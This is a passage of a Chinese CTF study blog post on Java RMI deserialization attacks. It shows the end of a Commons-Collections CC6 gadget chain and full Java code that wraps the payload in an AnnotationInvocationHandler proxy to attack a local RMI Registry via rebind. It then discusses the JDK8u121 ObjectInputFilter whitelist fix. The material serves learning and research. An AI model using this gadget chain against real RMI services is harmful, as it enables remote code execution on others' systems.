expMap.put(tiedMapEntry, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// remove the pair &quot;&#x27;test&#x27;:1&quot; inserted by LazyMap#get()</span></span><br><span class="line">    outerMap.remove(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use reflection to put real transformer in</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> expMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>唯一需要注意的点是，中间 <code>remove</code> 去除了 <code>LazyMap</code> 在第一次 <code>expMap.put()</code> 时触发 <code>tiedMapEntry.hashcode()</code> 进而触发 <code>tiedMapEntry.getValue()</code> 进而触发 <code>map.get()</code> 时被 <code>LazyMap</code> 特性插入的值；</p>
+<p><code>LazyMap</code> 的特点是 <code>get</code> 不存在的值会触发 <code>transformer</code>，然后返回并插入 <code>transformer</code> 的返回值，必须要移除掉这个值，靶机真正反序列化 payload 的时候才能再次调用恶意的 transformer；</p>
+<p>理解了这一点，基本就理解了 CC6；</p>
+<h3 id="Registry-Attack"><a href="#Registry-Attack" class="headerlink" title="Registry Attack"></a>Registry Attack</h3><p>先把 SDK 改成 <code>JDK8u20</code>；</p>
+<p>已知 <code>registry.rebind()</code>，<code>registry.bind()</code>，<code>registry.lookup()</code> 过程都会触发反序列化，以从 Server 端 <code>registry.rebind()</code> 打 Register 端为例，其传递的对象参数必须实现 <code>Remote</code> 接口，通过动态代理 <code>InvocationHandler</code> 的方式可以给 payload 包装一层 <code>Remote</code> 接口；</p>
+<p>选用 <code>AnnotationInvocationHandler</code> 是因为其可以包含一个任意 <code>Map</code> 对象的序列化数据，很好用，因此与 CC1 被修复了无关，只要有反序列化 <code>AnnotationInvocationHandler</code> 的条件，这个包装方式其实是可以长足利用的；</p>
+<p>进行代理之后辅以强转即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).</span><br><span class="line">	getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, getEvilClass());</span><br><span class="line"><span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(RMIServer.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br></pre></td></tr></table></figure>
+
+<p>完整代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OBJECT_URL</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Hello&quot;</span>;</span><br><span class="line">    <span class="comment">//    private static final String CODEBASE_URL = &quot;http://127.0.0.1:9999/&quot;;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">POLICY_FILE</span> <span class="operator">=</span> <span class="string">&quot;rmi.policy&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SERVER_START_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;SERVER STARTED&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REGISTRY_IP</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// start server</span></span><br><span class="line">        <span class="comment">// System.setProperty(&quot;java.rmi.server.codebase&quot;, CODEBASE_URL);</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RMIServer.class.getClassLoader().</span><br><span class="line">                getResource(POLICY_FILE).toString());</span><br><span class="line">        LocateRegistry.createRegistry(REGISTRY_PORT);</span><br><span class="line">        <span class="type">RMIClass</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIClassImpl</span>();</span><br><span class="line">        Naming.bind(OBJECT_URL, remoteObject);</span><br><span class="line">        System.out.println(SERVER_START_MESSAGE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// attack registry by CC6</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(REGISTRY_IP, REGISTRY_PORT);</span><br><span class="line">        <span class="comment">// use any serializable InvocationHandler to do proxy</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).</span><br><span class="line">                getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, getEvilClass());</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(</span><br><span class="line">                RMIServer.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line">        registry.rebind(<span class="string">&quot;QST&quot;</span>, remote);</span><br><span class="line">        <span class="comment">// registry.bind(&quot;QST&quot;, remote);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">// CC6 payload generation</span></span><br><span class="line">        <span class="keyword">return</span> expMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="fix-in-jdk8u121"><a href="#fix-in-jdk8u121" class="headerlink" title="fix in jdk8u121"></a>fix in jdk8u121</h4><p>白名单 <code>ObjectInputFilter</code> 机制加入，RMI Registry 首当其冲，新增的 <code>RegistryImpl#registryFilter</code>  使用讨厌的白名单机制过滤反序列化数据的属性：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> String.class != var2 &amp;&amp; </span><br><span class="line">    !Number.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">        !Remote.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">            !Proxy.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !RMIClientSocketFactory.class.isAssignableFrom(var2) </span><br><span class="line">                        &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                            !ActivationID.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                                !UID.class.isAssignableFrom(var2) </span><br><span class="line">                                    ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>
+
+<p>下断点动调一下，发现 <code>ObjectInputFilter</code> 对类的检查是递归的，如 <code>AnnotationInvocationHandle</code> 这些内部类会被检查出来 <code>REJECTED</code> 掉；</p>
+<p>如何用有限的类去构造 gadget 就成了问题，先写到这；</p>
+<h2 id="总会"><a href="#总会" class="headerlink" title="总会"></a>总会</h2><p>粘腻的青春已然板结了他的土壤，播种下再多的种子，他的青春也只是一场空，而非能够在未来的某一天发芽了；</p>
+<p>好想再来一次，虽然总会成为老师的。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-Java/" rel="tag"># CTF-Java</a>
+              <a href="/tags/CTF-web/" rel="tag"># CTF-web</a>
+              <a href="/tags/RMI/" rel="tag"># RMI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/09/15/2024-09-15-%E4%B8%A4%E5%B9%B4%E4%B8%8A%E4%B8%8B/" rel="prev" title="两年上下">
+      <i class="fa fa-chevron-left"></i> 两年上下
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/09/19/2024-09-19-byteCTF2024-scxml/" rel="next" title="byteCTF2024-scxml">
+      byteCTF2024-scxml <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B7%BB%E7%A0%96-Java-%E5%A3%B9"><span class="nav-number">1.</span> <span class="nav-text">添砖 Java 壹</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI"><span class="nav-number">1.1.</span> <span class="nav-text">RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server"><span class="nav-number">1.1.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client"><span class="nav-number">1.1.2.</span> <span class="nav-text">Client</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">动态类加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">安全策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-1"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">安全策略</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-Attack"><span class="nav-number">1.1.3.</span> <span class="nav-text">Server Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#evil-params"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">evil params</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC6"><span class="nav-number">1.1.4.</span> <span class="nav-text">CC6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Registry-Attack"><span class="nav-number">1.1.5.</span> <span class="nav-text">Registry Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fix-in-jdk8u121"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">fix in jdk8u121</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E4%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">总会</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">QST137</p>
+  <div class="site-description" itemprop="description">苍山岁岁有人去，唯愿洱海生白波。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Qst137" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Qst137" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:Q_ST@bupt.edu.cn" title="E-Mail → mailto:Q_ST@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">QST137</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
